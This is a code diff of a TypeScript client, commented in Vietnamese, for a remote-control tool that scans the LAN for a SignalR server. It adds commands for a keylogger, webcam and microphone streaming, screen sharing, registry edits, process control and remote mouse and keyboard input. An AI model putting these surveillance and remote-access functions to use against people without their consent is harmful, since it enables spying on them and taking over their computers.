@@ -1,8 +1,8 @@
-﻿// file: src/services/socketService.ts
-import { HubConnection, HubConnectionBuilder, LogLevel } from '@microsoft/signalr';
+﻿import { HubConnection, HubConnectionBuilder, LogLevel } from '@microsoft/signalr';
 
 // Khai báo biến connection để dùng chung
 let connection: HubConnection;
+
 const checkIP = async (ip: string): Promise<string | null> => {
     try {
         const controller = new AbortController();
@@ -32,39 +32,57 @@ const checkIP = async (ip: string): Promise<string | null> => {
 
 // 2. Kỹ thuật Batching (Chia lô để quét)
 export const scanForServer = async (baseIP: string = "192.168.1"): Promise<string | null> => {
-    console.log(`Đang quét mạng LAN dải ${baseIP}.x ...`);
+    console.log(`📡 Đang quét mạng LAN dải ${baseIP}.x (Thuật toán 2 đầu)...`);
 
-    // Chia 255 IP thành các lô, mỗi lô 20 IP
-    const BATCH_SIZE = 20;
+    // 1. TẠO DANH SÁCH IP THEO THỨ TỰ ƯU TIÊN (Đầu -> Cuối -> Giữa)
+    // Kết quả sẽ là: [1, 254, 2, 253, 3, 252, ...]
+    const orderedIPs: string[] = [];
+    let left = 1;
+    let right = 254;
 
-    for (let i = 1; i < 255; i += BATCH_SIZE) {
-        const batchPromises = [];
-
-        // Tạo một lô request
-        for (let j = 0; j < BATCH_SIZE; j++) {
-            const currentNum = i + j;
-            if (currentNum >= 255) break;
-
-            const ip = `${baseIP}.${currentNum}`;
-            batchPromises.push(checkIP(ip));
+    while (left <= right) {
+        if (left === right) {
+            orderedIPs.push(`${baseIP}.${left}`);
+        } else {
+            orderedIPs.push(`${baseIP}.${left}`);
+            orderedIPs.push(`${baseIP}.${right}`);
         }
+        left++;
+        right--;
+    }
 
-        // Chạy song song lô này và chờ xong mới chạy lô tiếp theo
-        // Điều này giúp trình duyệt không bị quá tải
+    // 2. TĂNG KÍCH THƯỚC BATCH ĐỂ QUÉT NHANH HƠN
+    // Mạng LAN thường chịu được 50-100 request cùng lúc.
+    // Nếu để 20 thì phải chờ 13 lượt. Để 50 chỉ cần chờ 5 lượt.
+    const BATCH_SIZE = 50;
+
+    // 3. CHẠY LOOP THEO MẢNG ĐÃ SẮP XẾP
+    for (let i = 0; i < orderedIPs.length; i += BATCH_SIZE) {
+        // Cắt ra 1 lô 50 IP từ danh sách đã sắp xếp
+        const batchIPs = orderedIPs.slice(i, i + BATCH_SIZE);
+
+        // Tạo promise cho lô này
+        const batchPromises = batchIPs.map(ip => checkIP(ip));
+
+        console.log(`Checking batch: ${batchIPs[0]} ... ${batchIPs[batchIPs.length - 1]}`);
+
+        // Chờ cả lô chạy xong (Song song)
         const results = await Promise.all(batchPromises);
 
-        // Kiểm tra xem trong lô này có IP nào phản hồi không
+        // Tìm xem có thằng nào phản hồi không
         const foundIP = results.find(ip => ip !== null);
 
         if (foundIP) {
             console.log(`✅ Đã tìm thấy Server tại: ${foundIP}`);
-            return foundIP; // Tìm thấy là dừng ngay, không quét nữa
+            return foundIP; // Tìm thấy là return luôn, cắt vòng lặp
         }
     }
 
     console.log("❌ Không tìm thấy Server nào.");
     return null;
-};// Sửa lại hàm initSocket để nhận IP động
+};
+
+// Sửa lại hàm initSocket để nhận IP động
 export const initSocket = (serverIP: string): HubConnection => {
     const SERVER_URL = `http://${serverIP}:5000/systemHub`;
 
@@ -76,16 +94,14 @@ export const initSocket = (serverIP: string): HubConnection => {
         .configureLogging(LogLevel.Information)
         .build();
 
-    connection.start()
-        .then(() => {
-            console.log('[SignalR] Kết nối thành công tới Server C#!');
-            // alert("Kết nối thành công!"); // Có thể mở dòng này nếu muốn test
-        })
-        .catch((err) => {
-            console.error('[SignalR] Lỗi kết nối:', err);
-            // --- THÊM DÒNG NÀY ĐỂ NÓ BÁO LỖI RA MÀN HÌNH ---
-            alert("KHÔNG KẾT NỐI ĐƯỢC!\nLỗi chi tiết: " + err.toString());
-        });
+    //connection.start()
+    //    .then(() => {
+    //        console.log('[SignalR] Kết nối thành công tới Server C#!');
+    //    })
+    //    .catch((err) => {
+    //        console.error('[SignalR] Lỗi kết nối:', err);
+    //        alert("KHÔNG KẾT NỐI ĐƯỢC!\nLỗi chi tiết: " + err.toString());
+    //    });
     return connection;
 };
 
@@ -105,6 +121,7 @@ export const sendCommand = async (action: string, payload?: any) => {
 
         // Ánh xạ từ tên lệnh của Client sang tên hàm trong SystemHub.cs của Server
         switch (action) {
+            // --- NHÓM LỆNH CŨ ---
             case 'start_keylog':
                 await connection.invoke("StartKeylog");
                 break;
@@ -124,14 +141,11 @@ export const sendCommand = async (action: string, payload?: any) => {
                 await connection.invoke("GetProcesses");
                 break;
             case 'kill_process':
-                // payload ở đây sẽ là PID (số)
                 await connection.invoke("KillProcess", Number(payload));
                 break;
             case 'start_app':
-                // Payload chính là tên App (ví dụ: "notepad.exe")
                 await connection.invoke("StartApp", String(payload));
                 break;
-            // Registry (nếu payload là object chứa thông tin registry)
             case 'registry_command':
                 if (payload) {
                     await connection.invoke("SendRegistryCommand",
@@ -143,14 +157,78 @@ export const sendCommand = async (action: string, payload?: any) => {
                 await connection.invoke("GetWebcams");
                 break;
             case 'start_webcam':
-                // payload ở đây là index của camera (số 0, 1, 2...)
                 await connection.invoke("StartWebcam", Number(payload));
                 break;
-
             case 'stop_webcam':
                 await connection.invoke("StopWebcam");
                 break;
+
+            // --- [QUAN TRỌNG] NHÓM LỆNH ULTRAVIEWER MỚI ---
+            // Đây là phần bạn bị thiếu, tôi đã thêm vào:
+            case 'start_screenshare':
+                await connection.invoke("StartScreenShare");
+                break;
+            case 'stop_screenshare':
+                await connection.invoke("StopScreenShare");
+                break;
+            case 'remote_mousemove':
+                // payload = { x: 100, y: 200 }
+                await connection.invoke("RemoteMouseMove", payload.x, payload.y);
+                break;
+            case 'remote_click':
+                // payload = "left" hoặc "right"
+                await connection.invoke("RemoteMouseClick", payload);
+                break;
+            case 'remote_keypress':
+                // payload = mã phím (int)
+                await connection.invoke("RemoteKeyPress", payload);
+                break;
+            case 'remote_keydown':
+                await connection.invoke("RemoteKeyDown", payload);
+                break;
+            case 'remote_keyup':
+                await connection.invoke("RemoteKeyUp", payload);
+                break;
+            // [MỚI] Reset phím
+            case 'reset_keys':
+                await connection.invoke("ResetKeys");
+                break;
+            case 'start_webrtc':
+                // SỬA LẠI DÒNG NÀY
+                // payload lúc này là { camIndex: 0, micIndex: 0 }
+                // Nếu payload bị null/undefined thì truyền 0, 0 cho chắc
+                const camIdx = payload?.camIndex ?? 0;
+                const micIdx = payload?.micIndex ?? 0;
+
+                // Invoke phải truyền các tham số cách nhau bởi dấu phẩy
+                await connection.invoke("RequestWebRTCStream", camIdx, micIdx);
+                break;
+            case 'send_webrtc_answer':
+                // payload = chuỗi SDP
+                await connection.invoke("SendWebRTCAnswer", payload);
+                break;
+            case 'send_ice_candidate':
+                // payload = chuỗi JSON candidate
+                await connection.invoke("SendIceCandidate", payload);
+                break;
+
+            case 'remote_scroll':
+                // Gọi đúng tên hàm mà ta đã map bên Server bằng [HubMethodName("remote_scroll")]
+                // Dùng 'connection' thay vì 'socket', dùng 'payload' thay vì 'data'
+                await connection.invoke('remote_scroll', payload); 
+                break;
+            // --- THÊM 2 CÁI NÀY ĐỂ KÉO THẢ (DRAG & DROP) ---
+            case 'remote_mousedown':
+                // payload = "left" hoặc "right"
+                await connection.invoke("RemoteMouseDown", payload);
+                break;
+            case 'remote_mouseup':
+                // payload = "left" hoặc "right"
+                await connection.invoke("RemoteMouseUp", payload);
+                break;
+            // -----------------------------------------------
             default:
+                // Nếu lệnh không khớp cái nào ở trên thì sẽ chạy vào đây và báo lỗi vàng
                 console.warn("Lệnh không được hỗ trợ:", action);
         }
     } catch (err) {
